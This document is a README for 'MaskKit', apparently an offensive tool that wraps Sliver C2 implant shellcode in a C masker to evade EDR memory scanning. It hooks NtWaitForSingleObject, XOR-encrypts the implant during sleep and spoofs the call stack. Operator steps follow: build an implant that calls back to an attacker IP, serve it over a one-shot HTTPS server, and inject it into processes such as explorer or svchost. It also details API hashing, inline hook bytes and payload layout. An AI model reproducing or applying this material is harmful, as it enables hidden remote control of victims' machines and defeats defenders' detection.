# MaskKit

Sleep Mask Kit for Sliver C2. Part of the **Sliver Defense Evasion Suite**.

Wraps a Sliver shellcode in a C masker that hooks `NtWaitForSingleObject`, detects C2 sleep calls by duration, and XOR-encrypts the shellcode in memory during the sleep window. Stack spoofing via ntdll RET gadget. No Cobalt Strike license required.

---

## What It Does

When Sliver's Go runtime sleeps between C2 callbacks, it calls `ntdll!NtWaitForSingleObject`. MaskKit installs an inline hook on that function:

- **Short waits** (goroutine scheduler, <threshold): pass through unchanged, no performance impact
- **Long waits** (C2 sleep, ≥threshold): trigger the mask cycle
  1. XOR-encrypt the Sliver shellcode bytes
  2. Change memory protection: `PAGE_EXECUTE_READ → PAGE_READWRITE`
  3. Replace the masker thread's return address with an `ntdll` RET gadget (stack spoof)
  4. Wait the original duration
  5. Change protection back: `PAGE_READWRITE → PAGE_EXECUTE_READ`
  6. XOR-decrypt (same operation — restores original bytes)
  7. Restore real return address

An EDR memory scanner that fires during the sleep window sees:
- No executable shellcode (region is `PAGE_READWRITE`, not `PAGE_EXECUTE_READ`)
- XOR-encrypted bytes (no recognizable shellcode signature)
- A normal-looking ntdll call stack on the masker thread

---

## How It Differs from SleepKit

| | MaskKit | SleepKit |
|--|---------|----------|
| **Output format** | Raw `.bin` shellcode | Windows `.exe` binary |
| **Delivery** | Inject into any process | Execute as standalone EXE |
| **Hook target** | `NtWaitForSingleObject` (inline hook in C) | `kernel32!Sleep` (JMP patch from Go) |
| **Stack spoofing** | Yes — gadget-based return address replacement | No |
| **Go runtime in payload** | No (pure C shellcode) | Yes (Go host) |
| **Masking granularity** | Duration-based (hooks the exact sleep call) | Timer-based + hook |

---

## Evasion Stack

| Layer | Technique |
|-------|-----------|
| **No IAT** | All Win32/NT calls resolved via ROR13 PEB walk at runtime |
| **No RWX** | Alloc RW → copy SC → protect RX before executing |
| **Encrypted in transit** | Shellcode XOR-encrypted in the payload blob |
| **Encrypted in memory** | XOR-masked + RW during C2 sleep |
| **Stack spoofing** | `ntdll` RET gadget replaces masker return addr during wait |
| **No PE headers** | Output is a flat PIC shellcode blob, not a PE file |

---

## Prerequisites

- **Go 1.21+**: `go version`
- **mingw-w64**: `apt install mingw-w64`

---

## Setup

### 1. Compile the masker C objects and build the CLI

```bash
cd Sleep-Mask-Kit/maskkit
make all
```

Expected output:
```
x86_64-w64-mingw32-gcc -DWIN_X64 -shared ... unity.c -o ../bin/masker.x64.o
go build -o maskkit ./cmd/maskkit
```

Or separately:
```bash
make masker   # compile C objects only  → bin/masker.x64.o
make cli      # build Go CLI only       → ./maskkit
```

With garble (obfuscated symbols in the CLI binary):
```bash
make cli-garble   # requires: go install mvdan.cc/garble@latest
```

### 2. Verify

```bash
./maskkit gen-hashes
```

Should print ROR13 hashes for all NT functions the masker uses. If the output matches `src/services.c`, the build is correct.

---

## Usage

### Step 1: Generate a Sliver shellcode

In the Sliver server console:
```
sliver > generate --format shellcode --os windows --arch amd64 --mtls YOUR_IP --save implant.bin
```

Note the sleep setting — the masking threshold must be lower than Sliver's sleep duration. Default Sliver sleep is 60s; default threshold is 5s. Any C2 sleep ≥5s will be masked.

### Step 2: Wrap with MaskKit

```bash
./maskkit wrap \
    --shellcode implant.bin \
    --threshold 5000 \
    --output build/masked.bin
```

Output:
```
[*] Shellcode: 589824 bytes
[*] Masker shellcode: 3472 bytes
[+] Payload: 593384 bytes → build/masked.bin
[+] Key: a1b2c3d4e5f6...
[+] Threshold: 5000 ms (waits > 5s trigger masking)
```

What this builds:
- Links all C masker sources into a single PIC shellcode (~3.4 KB)
- Generates a random 32-byte XOR key
- XOR-encrypts your Sliver shellcode
- Assembles: `[masker code][magic marker][config][key][encrypted SC]`

### Step 3: Serve the payload

```bash
./maskkit serve --payload build/masked.bin --port 8443
```

One-shot HTTPS server with a randomized URL. Shuts down 500ms after one download.

```
[*] Serving 593384 bytes on https://0.0.0.0:8443/a3f91c04b2e8d17f
```

### Step 4: Deliver and execute

Deliver `masked.bin` to the target via any method:
- **Process injection**: inject into a legitimate process (explorer, svchost, etc.)
- **PalaceKit**: `palacekit build --shellcode build/masked.bin` wraps it in a Crystal Kit loader
- **Custom loader**: feed to any shellcode runner

The shellcode is position-independent — it doesn't matter where in memory it lands.

### Step 5: Observe in Sliver

When the shellcode runs:
1. Masker decrypts the Sliver shellcode and runs it via `NtCreateThreadEx`
2. Sliver connects back to your C2
3. On each C2 sleep, the hook fires, masks, waits, unmasks
4. Memory scanners see garbage bytes in a non-executable region during the scan window

---

## Command Reference

### `maskkit wrap`

Wrap a Sliver shellcode with the masker. Primary command.

```
Flags:
  --shellcode string   path to Sliver shellcode .bin (required)
  -o, --output string  output path (default: build/masked.bin)
  --threshold uint     min wait duration in ms to trigger masking (default: 5000)
  --interval uint      timer-based poll interval ms; 0 = hook-only (default: 0)
  --key string         hex XOR key — random 32 bytes if empty
  --bin-dir string     COFF .o objects directory (default: bin)
```

**threshold**: Minimum `NtWaitForSingleObject` duration to be treated as a C2 sleep. Go's scheduler waits microseconds to ~10ms. 5000ms (5s) catches C2 sleeps without false-positives on goroutine scheduling.

**interval**: When non-zero, a timer loop also masks every N ms regardless of what the shellcode is doing. Adds defense-in-depth but increases CPU usage. Default 0 (hook-only) is recommended.

### `maskkit make`

Compile C sources and wrap in one step:

```bash
./maskkit make --shellcode implant.bin --threshold 5000
```

Equivalent to `make masker` followed by `./maskkit wrap`.

### `maskkit serve`

```
Flags:
  --payload string   path to masked.bin (required)
  --port int         HTTPS port (default: 8443)
```

### `maskkit gen-hashes`

Print ROR13 hashes for the NT functions the masker resolves via PEB walk.

```bash
./maskkit gen-hashes
```

---

## How It Works — Technical Detail

### Payload Layout

```
┌──────────────────────────────────────────┐
│  Masker shellcode (PIC x64)              │
│  [go() at offset 0 — resolve, hook,      │
│   alloc, decrypt, NtCreateThreadEx]      │
│  [mask_on / mask_off / xor_region]       │
│  [hook_NtWaitForSingleObject]            │
│  [patch_resolve / resolve_all]           │
├──────────────────────────────────────────┤
│  Magic: 0xB33FCAFE 0xDEAD1337            │  ← 8 bytes
├──────────────────────────────────────────┤
│  Config (16 bytes)                       │
│    interval_ms   [4]                     │
│    threshold_ms  [4]                     │
│    key_len       [4]                     │
│    sc_len        [4]                     │
├──────────────────────────────────────────┤
│  XOR key  [key_len bytes]                │
├──────────────────────────────────────────┤
│  XOR-encrypted Sliver shellcode          │
└──────────────────────────────────────────┘
```

### Config Discovery

The masker finds its config block without knowing its load address, using a two-instruction PIC trick:

```asm
call 1f     ; push return address (= next instruction = base+5)
1:
pop rax     ; rax = base+5
sub rax, 5  ; rax = base (shellcode load address)
```

Then scans forward for the 8-byte magic `0xB33FCAFE 0xDEAD1337`. The config struct immediately follows.

### API Resolution

All Win32 and NT calls are resolved at runtime via ROR13 hash of the function name — no IAT entries, no strings like `"NtCreateThreadEx"` in the binary:

```c
uint32_t h = 0;
while (*name) {
    h = ((h >> 13) | (h << 19)) + (uint8_t)(*name++);
}
```

### The Inline Hook

A 12-byte `JMP [RIP+0]` trampoline is written over `NtWaitForSingleObject` in ntdll:

```
FF 25 00 00 00 00    JMP QWORD PTR [RIP+0]
XX XX XX XX XX XX XX XX  ← 8-byte absolute addr of hook_NtWaitForSingleObject
```

A 32-byte trampoline in the masker's own memory holds the displaced original bytes + a JMP back, so `_real_NtWaitForSingleObject` still works.

### Masking Decision

```
hook_NtWaitForSingleObject(h, alertable, timeout):
    if timeout == NULL or timeout >= 0:  pass through
    if already masking:                  pass through (reentrancy guard)
    if (-timeout) < threshold_100ns:    pass through (short goroutine wait)

    → mask_on()   [XOR encrypt + PAGE_READWRITE]
    → real wait   [actual sleep]
    → mask_off()  [XOR decrypt + PAGE_EXECUTE_READ]
```

### Unity Build

All four C sources (`services.c`, `mask.c`, `hook.c`, `masker.c`) are compiled into a single COFF object via `unity.c`. This eliminates MinGW's `.refptr`/ADDR64 cross-TU global indirection, which stores absolute runtime addresses and is incompatible with PIC shellcode.

---

## File Structure

```
maskkit/
├── cmd/
│   └── maskkit/
│       ├── main.go          # operator CLI
│       └── serve.go         # one-shot HTTPS server
├── src/
│   ├── unity.c              # unity build entry (includes all sources)
│   ├── masker.h             # types, declarations, magic constants
│   ├── masker.c             # go(): config find, self-protect, thread setup
│   ├── mask.c               # xor_region, mask_on, mask_off
│   ├── hook.c               # inline hook + stack spoof
│   └── services.c           # ROR13 PEB walk, resolve_all
├── bin/                     # compiled COFF object (after make masker)
│   └── masker.x64.o
├── internal/
│   ├── coff/                # AMD64 COFF parser
│   └── link/                # two-pass COFF linker
├── go.mod
├── Makefile
└── README.md
```
